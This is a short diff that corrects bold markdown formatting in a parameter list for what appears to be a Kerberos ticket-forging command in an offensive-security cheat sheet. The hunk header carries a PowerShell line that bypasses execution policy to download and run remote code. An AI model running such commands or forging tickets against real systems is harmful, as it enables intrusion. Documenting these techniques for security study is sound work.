@@ -46,11 +46,11 @@ powershell -ep bypass -c "iex(new-object system.net.webclient).downloadstring('h
 
 **/domain :** domain name
 
-**/sid: **domain SID value
+**/sid:** domain SID value
 
 **/target:** target service SPN
 
-**/service: **service name
+**/service:** service name
 
 **/user:** username to create ticket for
 
